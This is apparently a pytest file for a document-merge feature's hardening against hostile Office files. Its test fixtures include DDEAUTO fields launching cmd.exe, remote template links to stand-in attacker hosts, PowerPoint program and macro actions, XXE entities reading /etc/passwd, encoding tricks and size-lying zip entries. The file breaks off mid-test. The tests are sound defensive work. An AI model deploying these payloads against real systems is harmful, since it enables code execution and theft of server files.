#!/usr/bin/env python3
# test_file_merge_hardening.py
"""
Functional test for V2 file merge hardening against hostile files.
Version: 0.261.224
Implemented in: 0.261.224

This test ensures that merging never turns a hostile file into a merged file that
starts programs, fetches content or leaks server data. Word documents with fields that
start other programs (DDE or DDEAUTO, however the field code is split, nested, cased or
encoded, in the body, a header or the footnotes) are refused with only the file's name,
while ordinary fields and text that merely mentions DDE still merge. The first
document's link to its template is removed and linked content is reported. PowerPoint
click and hover actions that start programs or run macros are removed from every deck,
including the first, while web links are kept. Word, PowerPoint and Excel parts that
declare a document type, the way a part asks a parser to read server files, are refused
before any library parses them, reading only each part's prolog, and Office packages
that declare, or lie about, more uncompressed data than the limits allow are refused
before or while they are read.
"""

import io
import os
import re
import sys
import zipfile

import pytest

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "application", "single_app"))

from test_support.versioning import assert_app_version_at_least

from functions_document_merge import (
    DocumentMergeError,
    DocumentMergeLimits,
    DocumentMergeOptions,
    DocumentMergePart,
    merge_documents,
)


W_NS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
R_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
FOOTNOTES_TYPE = "application/vnd.openxmlformats-officedocument.wordprocessingml.footnotes+xml"
SECRET = "TOP-SECRET-MERGE-MARKER-7f3a"


def rewrite(data, edits=None, additions=None):
    """Copy a ZIP package, editing named entries and adding new ones."""
    edits = edits or {}
    source = zipfile.ZipFile(io.BytesIO(data))
    missing = set(edits) - set(source.namelist())
    if missing:
        raise AssertionError(f"The package has no {sorted(missing)} to edit.")
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as target:
        for info in source.infolist():
            content = source.read(info)
            if info.filename in edits:
                content = edits[info.filename](content)
            target.writestr(info, content)
        for name, content in (additions or {}).items():
            target.writestr(name, content)
    return output.getvalue()


def entries(data):
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        return {name: archive.read(name) for name in archive.namelist()}


def docx_bytes(text="Body", *, header=False):
    from docx import Document

    document = Document()
    document.add_paragraph(text)
    if header:
        document.sections[0].header.paragraphs[0].text = "Header"
    buffer = io.BytesIO()
    document.save(buffer)
    return buffer.getvalue()


def with_body(data, snippet, part_name="word/document.xml"):
    """Insert WordprocessingML paragraphs before a part's first paragraph."""
    def edit(content):
        text = content.decode("utf-8")
        index = text.index("<w:p>") if "<w:p>" in text else text.index("<w:p ")
        return (text[:index] + snippet + text[index:]).encode("utf-8")

    return rewrite(data, {part_name: edit})


def with_footnote_field(data, instruction):
    """Add a footnotes part, a part python-docx keeps as bytes, holding one field."""
    footnotes = (
        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<w:footnotes xmlns:w="{W_NS}"><w:footnote w:id="1"><w:p>'
        f'<w:fldSimple w:instr="{instruction}"><w:r><w:t>note</w:t></w:r></w:fldSimple>'
        f'</w:p></w:footnote></w:footnotes>'
    ).encode("utf-8")

    def add_relationship(content):
        return content.replace(
            b"</Relationships>",
            b'<Relationship Id="rIdNotes" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            b'relationships/footnotes" Target="footnotes.xml"/></Relationships>',
        )

    def add_type(content):
        return content.replace(
            b"</Types>",
            f'<Override PartName="/word/footnotes.xml" ContentType="{FOOTNOTES_TYPE}"/></Types>'.encode("utf-8"),
        )

    return rewrite(
        data,
        {"word/_rels/document.xml.rels": add_relationship, "[Content_Types].xml": add_type},
        {"word/footnotes.xml": footnotes},
    )


def simple_field(instruction, result="value"):
    # Quotes are escaped for the attribute; character references are kept as written.
    instruction = instruction.replace('"', "&quot;")
    return f'<w:p><w:fldSimple w:instr="{instruction}"><w:r><w:t>{result}</w:t></w:r></w:fldSimple></w:p>'


def complex_field(*codes, result="value"):
    runs = ['<w:r><w:fldChar w:fldCharType="begin"/></w:r>']
    runs += [f'<w:r><w:instrText xml:space="preserve">{code}</w:instrText></w:r>' for code in codes]
    runs += [
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>', f'<w:r><w:t>{result}</w:t></w:r>',
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>',
    ]
    return "<w:p>" + "".join(runs) + "</w:p>"


def word_parts(first, second):
    return [
        DocumentMergePart("a", "First.docx", lambda: first),
        DocumentMergePart("b", "Second.docx", lambda: second),
    ]


def merge_word(first, second, **options):
    with merge_documents("docx", word_parts(first, second), options=DocumentMergeOptions(**options)) as result:
        return result.read_bytes(), result.report


CALC = r"c:\\windows\\system32\\cmd.exe /k calc"
NESTED = (
    '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
    '<w:r><w:instrText xml:space="preserve"> IF </w:instrText></w:r>'
    '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
    f'<w:r><w:instrText xml:space="preserve"> DDEAUTO {CALC} </w:instrText></w:r>'
    '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>1</w:t></w:r>'
    '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
    '<w:r><w:instrText xml:space="preserve"> = 1 "a" "b" </w:instrText></w:r>'
    '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>a</w:t></w:r>'
    '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
)
UNSEPARATED = (
    '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
    f'<w:r><w:instrText xml:space="preserve">DDE {CALC}</w:instrText></w:r>'
    '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
)


def test_version_includes_file_merge_hardening():
    assert_app_version_at_least("0.261.224")


@pytest.mark.parametrize("hostile", [
    pytest.param(lambda: with_body(docx_bytes(), simple_field(f" DDEAUTO {CALC} ")), id="simple"),
    pytest.param(lambda: with_body(docx_bytes(), complex_field(" DD", f"EAUTO {CALC} ")), id="split-runs"),
    pytest.param(lambda: with_body(docx_bytes(), simple_field(f"ddeauto {CALC}")), id="lower-case"),
    pytest.param(lambda: with_body(docx_bytes(), simple_field(f"&#68;DE {CALC}")), id="character-reference"),
    pytest.param(lambda: with_body(docx_bytes(), complex_field(f'DDEAUTO"{CALC}"')), id="quoted-argument"),
    pytest.param(lambda: with_body(docx_bytes(), NESTED), id="nested-in-if"),
    pytest.param(lambda: with_body(docx_bytes(), UNSEPARATED), id="no-separator"),
    pytest.param(
        lambda: with_body(docx_bytes(header=True), simple_field(f"DDEAUTO {CALC}"), "word/header1.xml"),
        id="header",
    ),
    pytest.param(lambda: with_footnote_field(docx_bytes(), f"DDEAUTO {CALC}"), id="footnotes"),
])
@pytest.mark.parametrize("position", ["first", "second"])
def test_word_fields_that_start_programs_are_refused(hostile, position):
    clean = docx_bytes("Clean")
    first, second = (hostile(), clean) if position == "first" else (clean, hostile())
    with pytest.raises(DocumentMergeError) as refused:
        merge_word(first, second)
    assert refused.value.code == "active_content"
    expected = "First.docx" if position == "first" else "Second.docx"
    assert str(refused.value) == f"{expected} has fields that start other programs (DDE), so it can't be merged."


def test_ordinary_fields_and_text_about_dde_still_merge():
    from docx import Document

    first = with_body(docx_bytes(), "".join([
        complex_field(" PAGE "),
        simple_field(' QUOTE "DDEAUTO is not run here" '),
        simple_field(" MERGEFIELD DDEAUTO "),
        simple_field(" DDEX "),
        "<w:p><w:r><w:t>DDEAUTO c:\\windows\\system32\\cmd.exe</w:t></w:r></w:p>",
    ]))
    content, report = merge_word(first, docx_bytes("Second"))
    texts = [paragraph.text for paragraph in Document(io.BytesIO(content)).paragraphs]
    assert "DDEAUTO c:\\windows\\system32\\cmd.exe" in texts
    assert report["status"] == "merged"


def with_template_link(data, target):
    def add_element(content):
        text = content.decode("utf-8")
        start = text.index(">", text.index("<w:settings")) + 1
        element = f'<w:attachedTemplate xmlns:r="{R_NS}" r:id="rIdTemplate"/>'
        return (text[:start] + element + text[start:]).encode("utf-8")

    relationship = (
        '<Relationship Id="rIdTemplate" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        f'relationships/attachedTemplate" Target="{target}" TargetMode="External"/>'
    )
    existing = entries(data).get("word/_rels/settings.xml.rels")
    if existing is None:
        relationships = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            f"{relationship}</Relationships>"
        ).encode("utf-8")
        return rewrite(data, {"word/settings.xml": add_element}, {"word/_rels/settings.xml.rels": relationships})
    return rewrite(data, {
        "word/settings.xml": add_element,
        "word/_rels/settings.xml.rels": lambda content: content.replace(
            b"</Relationships>", relationship.encode("utf-8") + b"</Relationships>",
        ),
    })


def with_linked_image(data):
    return rewrite(data, {"word/_rels/document.xml.rels": lambda content: content.replace(
        b"</Relationships>",
        b'<Relationship Id="rIdLinked" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        b'relationships/image" Target="https://example.com/logo.png" TargetMode="External"/></Relationships>',
    )})


def test_template_links_are_removed_and_linked_content_is_reported():
    first = with_linked_image(with_template_link(docx_bytes("First"), r"\\attacker\share\template.dotm"))
    second = with_template_link(docx_bytes("Second"), "https://attacker.example/second.dotm")
    content, report = merge_word(first, second)
    package = entries(content)
    assert b"attachedTemplate" not in package["word/settings.xml"]
    for name, data in package.items():
        assert b"attacker" not in data, name
    assert {"code": "linked_template_removed", "message": (
        "This document's link to its template was removed, so Word won't fetch the template."
    )} in report["parts"][0]["warnings"]
    assert {"code": "linked_content", "message": (
        "The merged document links to content in other files or on the web; the links were kept."
    )} in report["warnings"]
    assert b"https://example.com/logo.png" in package["word/_rels/document.xml.rels"]

    plain, plain_report = merge_word(docx_bytes("First"), docx_bytes("Second"))
    assert all(warning["code"] != "linked_content" for warning in plain_report["warnings"])
    assert all(warning["code"] != "linked_template_removed" for warning in plain_report["parts"][0]["warnings"])


def deck_bytes(label, *, program=None, run_action=None, web=False):
    from pptx import Presentation

    presentation = Presentation()
    first = presentation.slides.add_slide(presentation.slide_layouts[0])
    first.shapes.title.text = f"{label} intro"
    if web:
        first.shapes.title.click_action.hyperlink.address = "https://example.com/web"
    second = presentation.slides.add_slide(presentation.slide_layouts[1])
    second.shapes.title.text = f"{label} actions"
    if program:
        second.shapes.title.click_action.hyperlink.address = "c:\\windows\\system32\\calc.exe"
    if run_action:
        body = second.placeholders[1].text_frame.paragraphs[0].add_run()
        body.text = "run me"
        body.hyperlink.address = "evil.exe"
    buffer = io.BytesIO()
    presentation.save(buffer)
    data = buffer.getvalue()

    def add_actions(content):
        text = content.decode("utf-8")
        if program:
            text = text.replace("<a:hlinkClick ", f'<a:hlinkClick action="{program}" ', 1)
        if run_action:
            position = text.rindex("<a:hlinkClick ")
            text = text[:position] + text[position:].replace(
                "<a:hlinkClick ", f'<a:hlinkClick action="{run_action}" ', 1,
            )
        return text.encode("utf-8")

    return rewrite(data, {"ppt/slides/slide2.xml": add_actions}) if (program or run_action) else data


def test_powerpoint_actions_that_start_programs_or_macros_are_removed():
    from lxml import etree
    from pptx import Presentation

    first = deck_bytes("A", program="ppaction://program", web=True)
    second = deck_bytes("B", program="PPACTION://PROGRAM", run_action="&#112;paction://macro?name=Evil")
    parts = [DocumentMergePart("a", "A.pptx", lambda: first), DocumentMergePart("b", "B.pptx", lambda: second)]
    with merge_documents("pptx", parts) as result:
        content = result.read_bytes()
        report = result.report
    package = entries(content)
    parser = etree.XMLParser(resolve_entities=False, no_network=True)
    actions = []
    for name, data in package.items():
        if name.endswith(".xml"):
            actions += [
                element.get("action") for element in etree.fromstring(data, parser).iter()
                if isinstance(element.tag, str) and element.get("action")
            ]
        if name.endswith(".rels"):
            assert b"calc.exe" not in data and b"evil.exe" not in data, name
    assert not [action for action in actions if action.lower().startswith(("ppaction://program", "ppaction://macro"))]
    assert any(b"https://example.com/web" in data for name, data in package.items() if name.endswith(".rels"))
    assert {"code": "active_content_removed", "message": (
        "Click and hover actions that start programs or run macros were removed; other links were kept."
    )} in report["warnings"]
    presentation = Presentation(io.BytesIO(content))
    assert [slide.shapes.title.text for slide in presentation.slides] == [
        "A intro", "A actions", "B intro", "B actions",
    ]

    plain = [
        DocumentMergePart("a", "A.pptx", lambda: deck_bytes("A", web=True)),
        DocumentMergePart("b", "B.pptx", lambda: deck_bytes("B")),
    ]
    with merge_documents("pptx", plain) as result:
        assert all(warning["code"] != "active_content_removed" for warning in result.report["warnings"])


def as_utf16_slide(data, slide="ppt/slides/slide2.xml"):
    """The same deck with one slide stored as UTF-16 XML, which Office Open XML allows."""
    def encode(content):
        return content.decode("utf-8").replace('encoding="UTF-8"', 'encoding="UTF-16"', 1).encode("utf-16")

    return rewrite(data, {slide: encode})


def with_renamed_slide(data, extension):
    """The same deck with its second slide stored under another extension, typed by an override."""
    source = zipfile.ZipFile(io.BytesIO(data))
    renames = {"ppt/slides/slide2.xml": f"ppt/slides/slide2.{extension}",
               "ppt/slides/_rels/slide2.xml.rels": f"ppt/slides/_rels/slide2.{extension}.rels"}
    edits = {
        "ppt/_rels/presentation.xml.rels": (b'Target="slides/slide2.xml"', f'Target="slides/slide2.{extension}"'.encode()),
        "[Content_Types].xml": (
            b'PartName="/ppt/slides/slide2.xml"', f'PartName="/ppt/slides/slide2.{extension}"'.encode(),
        ),
    }
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as target:
        for info in source.infolist():
            content = source.read(info)
            if info.filename in edits:
                old, new = edits[info.filename]
                assert old in content, info.filename
                content = content.replace(old, new)
            target.writestr(renames.get(info.filename, info.filename), content)
    return output.getvalue()


def every_action(content):
    """Every action attribute in any part of a package that parses as XML, whatever its name or encoding."""
    from lxml import etree

    parser = etree.XMLParser(resolve_entities=False, no_network=True)
    actions = []
    for name, data in entries(content).items():
        try:
            root = etree.fromstring(data, parser)
        except etree.XMLSyntaxError:
            continue
        actions += [element.get("action") for element in root.iter() if isinstance(element.tag, str) and element.get("action")]
    return actions


@pytest.mark.parametrize("disguise", [
    pytest.param(as_utf16_slide, id="utf16-slide"),
    # PowerPoint reads a part by its declared type, so no extension may hide a slide.
    pytest.param(lambda data: with_renamed_slide(data, "dat"), id="dat-slide"),
    pytest.param(lambda data: with_renamed_slide(data, "vml"), id="vml-slide"),
    pytest.param(lambda data: with_renamed_slide(data, "rels"), id="rels-slide"),
])
@pytest.mark.parametrize("position", ["first", "second"])
def test_program_actions_are_removed_whatever_a_slide_is_named_or_encoded(disguise, position):
    from pptx import Presentation

    hostile = disguise(deck_bytes("H", program="ppaction://program"))
    Presentation(io.BytesIO(hostile))
    clean = deck_bytes("C")
    decks = [("H.pptx", hostile), ("C.pptx", clean)] if position == "first" else [("C.pptx", clean), ("H.pptx", hostile)]
    parts = [DocumentMergePart(name, name, lambda data=data: data) for name, data in decks]
    with merge_documents("pptx", parts) as result:
        content = result.read_bytes()
        report = result.report
    assert not [action for action in every_action(content) if "program" in action.lower()]
    for name, data in entries(content).items():
        if name.endswith(".rels"):
            assert b"calc.exe" not in data, name
    assert any(warning["code"] == "active_content_removed" for warning in report["warnings"])
    labels = ["H", "C"] if position == "first" else ["C", "H"]
    assert [slide.shapes.title.text for slide in Presentation(io.BytesIO(content)).slides] == [
        f"{labels[0]} intro", f"{labels[0]} actions", f"{labels[1]} intro", f"{labels[1]} actions",
    ]


def with_entity(data, part_name, text, secret_path):
    """Declare an external entity naming a server file and use it in place of some text."""
    declaration = f'<!DOCTYPE root [<!ENTITY secret SYSTEM "{secret_path.as_uri()}">]>'

    def edit(content):
        decoded = content.decode("utf-8")
        if text not in decoded:
            raise AssertionError(f"{text!r} is not in {part_name}; the entity would never be used.")
        end = decoded.index("?>") + 2 if decoded.startswith("<?xml") else 0
        decoded = decoded[:end] + declaration + decoded[end:]
        return decoded.replace(text, "&secret;", 1).encode("utf-8")

    return rewrite(data, {part_name: edit})


def xlsx_bytes(value):
    from openpyxl import Workbook

    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Region", "Amount"])
    sheet.append([value, 5])
    buffer = io.BytesIO()
    workbook.save(buffer)
    return buffer.getvalue()


def assert_payload_is_live(data, part_name):
    """A parser that resolves entities would read the server file, so the test is meaningful."""
    from lxml import etree

    resolving = etree.XMLParser(resolve_entities=True, no_network=True, load_dtd=True)
    root = etree.fromstring(entries(data)[part_name], resolving)
    assert SECRET in "".join(root.itertext())


HOSTILE_PARTS = {
    "docx": ("word/document.xml", "Body", ("a.docx", "b.docx")),
    "pptx": ("ppt/slides/slide1.xml", "Hostile intro", ("a.pptx", "b.pptx")),
    "workbook": ("xl/worksheets/sheet1.xml", "Westward", ("a.xlsx", "b.csv")),
}


def hostile_and_clean(kind, secret_path):
    part_name, text, names = HOSTILE_PARTS[kind]
    original = {"docx": lambda: docx_bytes("Body"), "pptx": lambda: deck_bytes("Hostile"),
                "workbook": lambda: xlsx_bytes("Westward")}[kind]()
    clean = {"docx": lambda: docx_bytes("Other"), "pptx": lambda: deck_bytes("Clean"),
             "workbook": lambda: b"Region,Amount\r\nEast,1\r\n"}[kind]()
    hostile = with_entity(original, part_name, text, secret_path)
    assert_payload_is_live(hostile, part_name)
    return hostile, clean, names


@pytest.mark.parametrize("kind", ["docx", "pptx", "workbook"])
def test_office_parts_that_declare_entities_are_refused_before_parsing(tmp_path, kind):
    secret_path = tmp_path / "secret.txt"
    secret_path.write_text(SECRET)
    hostile, clean, names = hostile_and_clean(kind, secret_path)
    parts = [
        DocumentMergePart("a", names[0], lambda: hostile), DocumentMergePart("b", names[1], lambda: clean),
    ]
    with pytest.raises(DocumentMergeError) as refused:
        merge_documents(kind, parts)
    assert refused.value.code == "unreadable_document"
    message = str(refused.value)
    assert message.startswith(f"{names[0]} isn't a valid ")
    assert message.endswith("; it has XML that Office files can't contain.")
    assert SECRET not in message


def test_spreadsheet_merges_refuse_workbooks_that_declare_entities(tmp_path):
    from functions_tabular_merge import TabularMergeError, TabularMergeSource, merge_tabular_sources

    secret_path = tmp_path / "secret.txt"
    secret_path.write_text(SECRET)
    hostile, clean, _names = hostile_and_clean("workbook", secret_path)
    sources = [
        TabularMergeSource(source_id="a", file_name="a.xlsx", load_bytes=lambda: hostile),
        TabularMergeSource(source_id="b", file_name="b.csv", load_bytes=lambda: clean),
    ]
    with pytest.raises(TabularMergeError) as refused:
        merge_tabular_sources(sources)
    assert refused.value.code == "unreadable_workbook"
    assert str(refused.value) == "a.xlsx isn't a valid Excel workbook; it has XML that Excel files can't contain."


def package_with(part, *, extra=None):
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("ok/plain.xml", b'<?xml version="1.0"?><root/>')
        archive.writestr("media/image.png", b"<!DOCTYPE not xml, never read>")
        # Word keeps imported web pages (altChunk) as HTML parts, which may declare an HTML document type.
        archive.writestr("word/afchunk.htm", b"<!DOCTYPE html><html><body>imported</body></html>")
        for name, content in (extra or {}).items():
            archive.writestr(name, content)
        archive.writestr("ok/part.rels", part)
    return zipfile.ZipFile(io.BytesIO(output.getvalue()))


LONG_COMMENT = b"<?xml version=\"1.0\"?><!--" + b"x" * 3000 + b"-->"


@pytest.mark.parametrize("part, unsafe", [
    pytest.param(b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n<Relationships/>', False, id="plain"),
    pytest.param(b"\xef\xbb\xbf<?xml version=\"1.0\"?><!-- note --><?pi data?>\n<root/>", False, id="bom-comment-pi"),
    pytest.param(b"", False, id="empty"),
    pytest.param(b"<!DOCTYPE root><root/>", True, id="doctype"),
    pytest.param(
        b'<?xml version="1.0"?>\n<!-- a comment -->\n<!DOCTYPE root [<!ENTITY a "b">]><root>&a;</root>', True,
        id="doctype-after-comment",
    ),
    pytest.param('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r><r/>'.encode("utf-16"), True, id="utf16-bom"),
    pytest.param('<?xml version="1.0" encoding="UTF-16"?><r/>'.encode("utf-16-le"), False, id="utf16-le-plain"),
    pytest.param('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r><r/>'.encode("utf-16-be"), True, id="utf16-be"),
    pytest.param('<w:document xmlns:w="urn:w"/>'.encode("utf-16-le"), False, id="utf16-le-no-declaration"),
    # Office Open XML parts must be UTF-8 or UTF-16; other encodings could hide a declaration.
    pytest.param('<?xml version="1.0" encoding="UTF-32"?><!DOCTYPE r><r/>'.encode("utf-32"), True, id="utf32-bom"),
    pytest.param('<?xml version="1.0"?><r/>'.encode("utf-32-le"), True, id="utf32-no-bom"),
    pytest.param('<?xml version="1.0"?><r/>'.encode("cp500"), True, id="ebcdic"),
    pytest.param(b"<![CDATA[x]]><root/>", True, id="cdata-before-root"),
    pytest.param(b"<!doctype root><root/>", True, id="lowercase-doctype"),
    pytest.param("<?xml version=\"1.0\"?><\u00e9l\u00e8ve/>".encode("utf-8"), False, id="non-ascii-root"),
    # A declared encoding other than UTF-8 or UTF-16 can hide a declaration from a UTF-8 reading.
    pytest.param(
        b'<?xml version="1.0" encoding="UTF-7"?><!--+AC0ALQA+-<!DOCTYPE r [<!ENTITY e "x">]><r>&e;</r>', True,
        id="utf7-hidden-doctype",
    ),
    pytest.param(b'<?xml version="1.0" encoding="ISO-8859-1"?><r/>', True, id="latin1-declared"),
    pytest.param(b"<?xml version='1.0' encoding='utf-8' standalone='yes'?><r/>", False, id="lowercase-utf8-declared"),
    pytest.param(b'<?xml version="1.0" standalone="yes"?><r/>', False, id="no-encoding-declared"),
    # A declaration split across the reads, and prologs near and past the 4 KiB that is read.
    pytest.param(b"<?xml version=\"1.0\"?>" + b" " * 999 + b"<!DOCTYPE r><r/>", True, id="split-across-reads"),
    pytest.param(LONG_COMMENT + b"<root/>", False, id="long-prolog-within-limit"),
    pytest.param(LONG_COMMENT + b"<!DOCTYPE r><root/>", True, id="long-prolog-then-doctype"),
    pytest.param(b"<?xml version=\"1.0\"?><!--" + b"x" * 5000 + b"--><root/>", True, id="prolog-past-limit"),
    pytest.param(
        b"<?xml version=\"1.0\"?><!--" + b"x" * (70 * 1024) + b"--><!DOCTYPE r><r/>", True, id="prolog-far-past-limit",
    ),
])
def test_only_part_prologs_are_read_and_unsafe_ones_are_found(part, unsafe):
    from functions_ooxml_package_guard import first_unsafe_xml_part

    archive = package_with(part)
    found = first_unsafe_xml_part(archive, archive.infolist())
    assert found == ("ok/part.rels" if unsafe else None)


def content_types(defaults=(), overrides=()):
    rows = "".join(f'<Default Extension="{extension}" ContentType="{kind}"/>' for extension, kind in defaults)
    rows += "".join(f'<Override PartName="{name}" ContentType="{kind}"/>' for name, kind in overrides)
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        f'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">{rows}</Types>'
    ).encode("utf-8")


SLIDE_TYPE = "application/vnd.openxmlformats-officedocument.presentationml.slide+xml"
HOSTILE_XML = b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
SVG_WITH_DOCTYPE = (
    b'<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
    b'"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg xmlns="http://www.w3.org/2000/svg"/>'
)


@pytest.mark.parametrize("listed, name, content, unsafe", [
    # Parts are chosen by their declared type, matched without regard to case, not only by name.
    pytest.param([], "ppt/slides/slide1.dat", HOSTILE_XML, False, id="undeclared-binary-name"),
    pytest.param([("/ppt/slides/slide1.dat", SLIDE_TYPE)], "ppt/slides/slide1.dat", HOSTILE_XML, True, id="override"),
    pytest.param([("/PPT/Slides/SLIDE1.DAT", SLIDE_TYPE)], "ppt/slides/slide1.dat", HOSTILE_XML, True, id="override-case"),
    pytest.param([("/x/data.bin", "application/xml")], "x/data.bin", HOSTILE_XML, True, id="generic-xml"),
    # Pictures and web pages may legitimately declare a document type and are never parsed as Office XML.
    pytest.param([("/media/icon.svg", "image/svg+xml")], "media/icon.svg", SVG_WITH_DOCTYPE, False, id="svg-picture"),
    pytest.param([("/word/page.xhtml", "application/xhtml+xml")], "word/page.xhtml", SVG_WITH_DOCTYPE, False, id="xhtml"),
])
def test_parts_are_checked_by_their_declared_office_xml_type(listed, name, content, unsafe):
    from functions_ooxml_package_guard import first_unsafe_xml_part

    archive = package_with(
        b"<Relationships/>",
        extra={"[Content_Types].xml": content_types(defaults=[("svg", "image/svg+xml")], overrides=listed), name: content},
    )
    assert first_unsafe_xml_part(archive, archive.infolist()) == (name if unsafe else None)


def test_extension_defaults_select_parts_too():
    from functions_ooxml_package_guard import first_unsafe_xml_part

    archive = package_with(b"<Relationships/>", extra={
        "[Content_Types].xml": content_types(defaults=[("dat", SLIDE_TYPE)]), "ppt/slides/slide1.DAT": HOSTILE_XML,
    })
    assert first_unsafe_xml_part(archive, archive.infolist()) == "ppt/slides/slide1.DAT"


def test_an_unsafe_or_oversized_list_of_content_types_is_refused():
    from functions_ooxml_package_guard import UnreadablePackageError, first_unsafe_xml_part

    archive = package_with(b"<Relationships/>", extra={"[Content_Types].xml": HOSTILE_XML})
    assert first_unsafe_xml_part(archive, archive.infolist()) == "[Content_Types].xml"
    oversized = package_with(b"<Relationships/>", extra={
        "[Content_Types].xml": content_types() + b" " * (16 * 1024 * 1024 + 1),
    })
    assert first_unsafe_xml_part(oversized, oversized.infolist()) == "[Content_Types].xml"
    broken = package_with(b"<Relationships/>", extra={"[Content_Types].xml": b"<Types><Default"})
    with pytest.raises(UnreadablePackageError):
        first_unsafe_xml_part(broken, broken.infolist())


def damaged_entry(name, content):
    """A package whose one deflated entry has corrupt compressed data."""
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(name, content)
    data = bytearray(output.getvalue())
    with zipfile.ZipFile(io.BytesIO(bytes(data))) as archive:
        info = archive.getinfo(name)
    start = info.header_offset + 30 + len(name.encode("utf-8"))
    for position in range(start, start + info.compress_size):
        data[position] = 0xFF
    return zipfile.ZipFile(io.BytesIO(bytes(data)))


def test_unreadable_parts_and_failing_checks_are_told_apart():
    from functions_ooxml_package_guard import UnreadablePackageError, first_unsafe_xml_part

    archive = damaged_entry("word/document.xml", b'<?xml version="1.0"?><w:document/>' * 50)
    with pytest.raises(UnreadablePackageError):
        first_unsafe_xml_part(archive, archive.infolist())

    class Stopped(RuntimeError):
        """A cancellation check that fails must pass through, not read as a damaged file."""

    calls = []

    def stop():
        calls.append(True)
        if len(calls) == 2:
            raise Stopped()

    many = package_with(b"<Relationships/>", extra={f"parts/p{index}.xml": b"<r/>" for index in range(200)})
    with pytest.raises(Stopped):
        first_unsafe_xml_part(many, many.infolist(), check=stop)
    calls.clear()
    assert first_unsafe_xml_part(many, many.infolist(), check=lambda: calls.append(True)) is None
    # The check runs every 64 parts, so a package can't hold up cancellation for long.
    assert len(calls) == -(-len(many.infolist()) // 64)


def test_long_prologs_cost_little_and_a_package_has_a_reading_budget():
    import time

    from functions_ooxml_package_guard import first_unsafe_xml_part

    # Each part has a prolog just inside the limit, the most a part can make the check read.
    prolog = b"<?xml version=\"1.0\"?><!--" + b"x" * 3900 + b"--><r/>"
    within = package_with(b"<Relationships/>", extra={f"parts/p{index}.xml": prolog for index in range(4000)})
    started = time.monotonic()
    assert first_unsafe_xml_part(within, within.infolist()) is None
    assert time.monotonic() - started < 10
    # More such parts than the package's 32 MiB reading budget allows are refused, not read.
    beyond = package_with(b"<Relationships/>", extra={f"parts/p{index}.xml": prolog for index in range(9000)})
    started = time.monotonic()
    assert first_unsafe_xml_part(beyond, beyond.infolist()) is not None
    assert time.monotonic() - started < 20


def padded(data, name, size):
    return rewrite(data, additions={name: b"\0" * size})


def understated(data, name, declared):
    """Rewrite a ZIP so one entry claims fewer uncompressed bytes than it really holds."""
    buffer = bytearray(data)
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        info = archive.getinfo(name)
    encoded = name.encode("utf-8")
    local = info.header_offset
    assert buffer[local:local + 4] == b"PK\x03\x04"
    buffer[local + 22:local + 26] = declared.to_bytes(4, "little")
    for match in re.finditer(re.escape(b"PK\x01\x02"), bytes(buffer)):
        start = match.start()
        length = int.from_bytes(buffer[start + 28:start + 30], "little")
        if bytes(buffer[start + 46:start + 46 + length]) == encoded:
            buffer[start + 24:start + 28] = declared.to_bytes(4, "little")
    return bytes(buffer)


@pytest.mark.parametrize("kind, name, data", [
    ("docx", "a.docx", lambda: docx_bytes("Big")),
    ("pptx", "a.pptx", lambda: deck_bytes("Big")),
    ("workbook", "a.xlsx", lambda: xlsx_bytes("Big")),
])
def test_packages_declaring_too_much_data_are_refused_before_parsing(kind, name, data):
    hostile = padded(data(), "docProps/padding.bin", 3 * 1024 * 1024)
    other = {"docx": docx_bytes("Other"), "pptx": deck_bytes("Other"), "workbook": b"Region,Amount\r\nEast,1\r\n"}[kind]
    other_name = {"docx": "b.docx", "pptx": "b.pptx", "workbook": "b.csv"}[kind]
    parts = [DocumentMergePart("a", name, lambda: hostile), DocumentMergePart("b", other_name, lambda: other)]
    with pytest.raises(DocumentMergeError) as refused:
        merge_documents(kind, parts, limits=DocumentMergeLimits(max_package_uncompressed_bytes=2 * 1024 * 1024))
    assert refused.value.code == "source_too_large"
    assert str(refused.value) == f"{name} is too large to merge once uncompressed."


@pytest.mark.parametrize("kind, name, part_name", [
    ("docx", "a.docx", "word/document.xml"),
    ("pptx", "a.pptx", "ppt/slides/slide1.xml"),
])
def test_packages_that_understate_their_size_fail_while_reading(kind, name, part_name):
    data = docx_bytes("Body " * 2000) if kind == "docx" else deck_bytes("Body " * 2000)
    hostile = understated(data, part_name, 64)
